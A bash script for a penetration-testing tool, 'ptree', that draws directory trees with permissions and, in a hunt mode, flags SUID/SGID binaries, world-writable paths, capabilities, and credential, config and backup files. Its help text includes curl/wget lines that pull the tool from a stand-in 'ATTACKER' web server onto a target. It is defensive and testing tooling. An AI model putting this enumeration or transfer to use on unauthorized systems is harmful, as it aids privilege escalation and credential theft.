#!/bin/bash
# ptree - Pentest Tree: Filesystem visualization with permission focus
# Standalone script for target Linux systems
# Usage: ./ptree [OPTIONS] [PATH]

set -euo pipefail

# Defaults
MAX_DEPTH=3
HUNT_MODE=0
SHOW_HIDDEN=0
FOLLOW_LINKS=0
NO_COLOR=0
TARGET_PATH="."

# Colors (set later based on TTY)
C_RESET="" C_BOLD="" C_RED="" C_GREEN="" C_YELLOW="" C_BLUE="" C_MAGENTA="" C_CYAN="" C_DIM=""

# Detect stat flavor once (1=GNU, 0=BSD)
GNU_STAT=0

# Hunt mode patterns - use word boundaries where appropriate
# These match: exact name, or name ending with pattern
CRED_PATTERNS='^(shadow|passwd|password|credentials|htpasswd|\.netrc)$|id_rsa|id_dsa|id_ecdsa|id_ed25519|\.(pem|key|pgp|gpg)$'
CONFIG_PATTERNS='\.(conf|ini|env|cfg|config|yml|yaml|xml)$|^(web\.config|wp-config\.php|\.htaccess|\.htpasswd)$'
BACKUP_PATTERNS='\.(bak|backup|old|orig|save|swp)$|~$'

usage() {
    cat <<'EOF'
===============================================================================
  ptree - Pentest Tree: Filesystem visualization with permissions
===============================================================================

USAGE
    ptree [OPTIONS] [PATH]

    If PATH is omitted, uses current directory.

OPTIONS
    -d, --depth N      Max directory depth (default: 3)
    -H, --hunt         PrivEsc hunting mode - show only interesting files
    -a, --all          Include hidden files (dotfiles)
    -L, --follow       Follow symbolic links into directories
    -n, --no-color     Disable colored output
    -h, --help         Show this help message

OUTPUT FORMAT
    [drwxr-xr-x  755 root:root] dirname/
    [-rwsr-xr-x 4755 root:root] binary [SUID]
     |           |    |
     |           |    +-- owner:group
     |           +------- octal permissions (4-digit for special bits)
     +------------------- symbolic permissions

TAGS (Hunt Mode Highlights)
    [SUID]      Set-UID binary - runs as file owner
    [SGID]      Set-GID binary - runs as file group
    [WORLD-WR]  World-writable file or directory
    [CAP:xxx]   Linux capabilities set (e.g., cap_net_raw)
    [CONF]      Configuration file (.conf, .ini, .env, .yml, .xml)
    [CRED]      Potential credentials (shadow, passwd, id_rsa, .pem, .key)
    [BACKUP]    Backup file (.bak, .old, .backup, .swp)

EXAMPLES
    ptree /var                  # Tree of /var with depth 3
    ptree -H /                  # Hunt for privesc opportunities
    ptree -H -d 5 /opt          # Deep privesc hunt in /opt
    ptree -a -d 2 /home         # Show hidden files, depth 2
    ptree -H /usr/bin 2>/dev/null | grep SUID   # Find all SUID binaries

TRANSFER TO TARGET
    # Via curl/wget (if hosted on attacker web server)
    curl http://ATTACKER/ptree -o /tmp/ptree && chmod +x /tmp/ptree
    wget http://ATTACKER/ptree -O /tmp/ptree && chmod +x /tmp/ptree

    # Via base64 (copy-paste friendly)
    base64 -w0 ptree | # copy output, then on target:
    echo 'BASE64_STRING' | base64 -d > /tmp/ptree && chmod +x /tmp/ptree

===============================================================================
EOF
    exit 0
}

init_colors() {
    if [[ $NO_COLOR -eq 0 ]] && [[ -t 1 ]]; then
        C_RESET=$'\e[0m'
        C_BOLD=$'\e[1m'
        C_DIM=$'\e[2m'
        C_RED=$'\e[31m'
        C_GREEN=$'\e[32m'
        C_YELLOW=$'\e[33m'
        C_BLUE=$'\e[34m'
        C_MAGENTA=$'\e[35m'
        C_CYAN=$'\e[36m'
    fi
}

detect_stat_flavor() {
    if stat --version 2>/dev/null | grep -q GNU; then
        GNU_STAT=1
    fi
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--depth)
                if [[ ! "$2" =~ ^[0-9]+$ ]]; then
                    echo "Error: --depth requires a number" >&2
                    exit 1
                fi
                MAX_DEPTH="$2"
                shift 2
                ;;
            -H|--hunt)
                HUNT_MODE=1
                shift
                ;;
            -a|--all)
                SHOW_HIDDEN=1
                shift
                ;;
            -L|--follow)
                FOLLOW_LINKS=1
                shift
                ;;
            -n|--no-color)
                NO_COLOR=1
                shift
                ;;
            -h|--help)
                usage
                ;;
            -*)
                echo "Unknown option: $1" >&2
                exit 1
                ;;
            *)
                TARGET_PATH="$1"
                shift
                ;;
        esac
    done
}

# Get permission info for a file
# Returns: "rwx_perms octal owner:group"
get_perms() {
    local file="$1"
    local rwx octal owner group

    if [[ $GNU_STAT -eq 1 ]]; then
        rwx=$(stat -c '%A' "$file" 2>/dev/null) || rwx="??????????"
        octal=$(stat -c '%a' "$file" 2>/dev/null) || octal="???"
        owner=$(stat -c '%U' "$file" 2>/dev/null) || owner="?"
        group=$(stat -c '%G' "$file" 2>/dev/null) || group="?"
    else
        # BSD/macOS stat
        rwx=$(stat -f '%Sp' "$file" 2>/dev/null) || rwx="??????????"
        octal=$(stat -f '%OLp' "$file" 2>/dev/null) || octal="???"
        owner=$(stat -f '%Su' "$file" 2>/dev/null) || owner="?"
        group=$(stat -f '%Sg' "$file" 2>/dev/null) || group="?"
    fi

    # Pad octal to 4 digits for special bits visibility
    if [[ ${#octal} -eq 3 ]]; then
        octal=" $octal"
    fi

    echo "$rwx $octal $owner:$group"
}

# Check if file has special permissions (SUID/SGID)
is_suid() {
    [[ -u "$1" ]]
}

is_sgid() {
    [[ -g "$1" ]]
}

is_world_writable() {
    local file="$1"
    # Symlinks always show 777, skip them
    [[ -L "$file" ]] && return 1

    local octal
    if [[ $GNU_STAT -eq 1 ]]; then
        octal=$(stat -c '%a' "$file" 2>/dev/null) || return 1
    else
        octal=$(stat -f '%OLp' "$file" 2>/dev/null) || return 1
    fi
    # Check if last digit is 2, 3, 6, or 7 (world-writable)
    [[ "$octal" =~ [2367]$ ]]
}

# Check if file has capabilities
has_caps() {
    local file="$1"
    [[ -f "$file" ]] || return 1
    command -v getcap &>/dev/null || return 1
    local caps
    caps=$(getcap "$file" 2>/dev/null) || return 1
    [[ -n "$caps" ]]
}

# Check if file matches hunt patterns
is_interesting() {
    local file="$1"
    local name
    name=$(basename "$file")

    # SUID/SGID binaries (not symlinks - check actual file)
    if [[ -f "$file" ]] && ! [[ -L "$file" ]] && { is_suid "$file" || is_sgid "$file"; }; then
        return 0
    fi

    # World-writable
    if is_world_writable "$file"; then
        return 0
    fi

    # Capabilities
    if has_caps "$file"; then
        return 0
    fi

    # Credential files
    if [[ "$name" =~ $CRED_PATTERNS ]]; then
        return 0
    fi

    # Config files
    if [[ "$name" =~ $CONFIG_PATTERNS ]]; then
        return 0
    fi

    # Backup files
    if [[ "$name" =~ $BACKUP_PATTERNS ]]; then
        return 0
    fi

    return 1
}

# Get tags for interesting files
get_tags() {
    local file="$1"
    local tags=""
    local name
    name=$(basename "$file")

    # SUID/SGID only on actual files, not symlinks
    if [[ -f "$file" ]] && ! [[ -L "$file" ]]; then
        if is_suid "$file"; then
            tags+="${C_RED}${C_BOLD}[SUID]${C_RESET} "
        fi
        if is_sgid "$file"; then
            tags+="${C_YELLOW}${C_BOLD}[SGID]${C_RESET} "
        fi
    fi

    if is_world_writable "$file"; then
        tags+="${C_MAGENTA}${C_BOLD}[WORLD-WR]${C_RESET} "
    fi

    if has_caps "$file"; then
        local caps
        caps=$(getcap "$file" 2>/dev/null | sed 's/.*= //')
        tags+="${C_RED}${C_BOLD}[CAP:${caps}]${C_RESET} "
    fi

    if [[ "$name" =~ $CRED_PATTERNS ]]; then
        tags+="${C_RED}[CRED]${C_RESET} "
    fi

    if [[ "$name" =~ $CONFIG_PATTERNS ]]; then
        tags+="${C_YELLOW}[CONF]${C_RESET} "
    fi

    if [[ "$name" =~ $BACKUP_PATTERNS ]]; then
        tags+="${C_CYAN}[BACKUP]${C_RESET} "
    fi

    echo "$tags"
}

# Colorize filename based on type
colorize_name() {
    local file="$1"
    local name
    name=$(basename "$file")

    if [[ -L "$file" ]]; then
        # Symlink
        local target
        target=$(readlink "$file" 2>/dev/null) || target="?"
        echo "${C_CYAN}${name}${C_RESET} -> ${target}"
    elif [[ -d "$file" ]]; then
        echo "${C_BLUE}${C_BOLD}${name}/${C_RESET}"
    elif [[ -x "$file" ]]; then
        echo "${C_GREEN}${name}${C_RESET}"
    else
        echo "$name"
    fi
}

# Print a single entry
print_entry() {
    local file="$1"
    local prefix="$2"
    local connector="$3"
    local perms name_colored tags

    perms=$(get_perms "$file")
    name_colored=$(colorize_name "$file")
    tags=$(get_tags "$file")

    # Format: prefix + connector + [perms] + name + tags
    printf "%s%s[%s] %s %s\n" "$prefix" "$connector" "$perms" "$name_colored" "$tags"
}

# Print permission denied indicator
print_denied() {
    local dir="$1"
    local prefix="$2"
    local connector="$3"
    printf "%s%s${C_DIM}[permission denied]${C_RESET}\n" "$prefix" "$connector"
}

# Collect visible items from directory
collect_items() {
    local dir="$1"
    local -n result=$2
    result=()

    # Save current shopt state
    local old_dotglob old_nullglob
    old_dotglob=$(shopt -p dotglob 2>/dev/null) || old_dotglob="shopt -u dotglob"
    old_nullglob=$(shopt -p nullglob 2>/dev/null) || old_nullglob="shopt -u nullglob"

    if [[ $SHOW_HIDDEN -eq 1 ]]; then
        shopt -s dotglob nullglob
    else
        shopt -s nullglob
        shopt -u dotglob
    fi

    local item
    for item in "$dir"/*; do
        [[ -e "$item" ]] || [[ -L "$item" ]] || continue
        result+=("$item")
    done

    # Restore shopt state
    eval "$old_dotglob"
    eval "$old_nullglob"
}

# Check if directory has any interesting descendants (for hunt mode)
has_interesting_descendants() {
    local dir="$1"
    local depth="$2"

    [[ $depth -ge $MAX_DEPTH ]] && return 1

    # Check if we can read the directory
    [[ -r "$dir" ]] || return 1

    local items=()
    collect_items "$dir" items

    local item
    for item in "${items[@]}"; do
        if is_interesting "$item"; then
            return 0
        fi

        if [[ -d "$item" ]] && [[ ! -L "$item" || $FOLLOW_LINKS -eq 1 ]]; then
            if has_interesting_descendants "$item" $((depth + 1)); then
                return 0
            fi
        fi
    done

    return 1
}

# Filter items to only interesting ones (for hunt mode)
filter_interesting() {
    local -n items_ref=$1
    local depth=$2
    local filtered=()

    for item in "${items_ref[@]}"; do
        if [[ -d "$item" ]] && [[ ! -L "$item" || $FOLLOW_LINKS -eq 1 ]]; then
            # For directories: show if interesting OR has interesting descendants
            if is_interesting "$item" || has_interesting_descendants "$item" "$depth"; then
                filtered+=("$item")
            fi
        else
            # For files: only show if interesting
            if is_interesting "$item"; then
                filtered+=("$item")
            fi
        fi
    done

    items_ref=("${filtered[@]}")
}

# Recursive tree walk
walk_tree() {
    local dir="$1"
    local prefix="$2"
    local depth="$3"

    [[ $depth -gt $MAX_DEPTH ]] && return

    # Check if we can read the directory
    if [[ ! -r "$dir" ]]; then
        print_denied "$dir" "$prefix" "└── "
        return
    fi

    # Collect items
    local items=()
    collect_items "$dir" items

    # In hunt mode, filter to interesting items only
    if [[ $HUNT_MODE -eq 1 ]]; then
        filter_interesting items "$depth"
    fi

    local total=${#items[@]}
    local i=0

    for item in "${items[@]}"; do
        i=$((i + 1))
        local connector
        if [[ $i -eq $total ]]; then
            connector="└── "
        else
            connector="├── "
        fi

        print_entry "$item" "$prefix" "$connector"

        # Recurse into directories
        if [[ -d "$item" ]] && [[ ! -L "$item" || $FOLLOW_LINKS -eq 1 ]]; then
            local new_prefix
            if [[ $i -eq $total ]]; then
                new_prefix="${prefix}    "
            else
                new_prefix="${prefix}│   "
            fi
            walk_tree "$item" "$new_prefix" $((depth + 1))
        fi
    done
}

# Main
main() {
    parse_args "$@"
    init_colors
    detect_stat_flavor

    # Validate target path
    if [[ ! -e "$TARGET_PATH" ]]; then
        echo "Error: Path does not exist: $TARGET_PATH" >&2
        exit 1
    fi

    # Resolve to absolute path
    local resolved
    if [[ -d "$TARGET_PATH" ]] && resolved=$(cd "$TARGET_PATH" 2>/dev/null && pwd); then
        TARGET_PATH="$resolved"
    elif resolved=$(readlink -f "$TARGET_PATH" 2>/dev/null) && [[ -n "$resolved" ]]; then
        TARGET_PATH="$resolved"
    fi
    # If both fail, keep original path (will still work for stat/display)

    # Print header
    local header_perms
    header_perms=$(get_perms "$TARGET_PATH")
    local header_tags
    header_tags=$(get_tags "$TARGET_PATH")

    if [[ $HUNT_MODE -eq 1 ]]; then
        echo "${C_BOLD}[HUNT MODE]${C_RESET} Scanning for interesting files..."
        echo ""
    fi

    echo "[${header_perms}] ${C_BLUE}${C_BOLD}${TARGET_PATH}/${C_RESET} ${header_tags}"

    # Walk tree
    walk_tree "$TARGET_PATH" "" 1
}

main "$@"
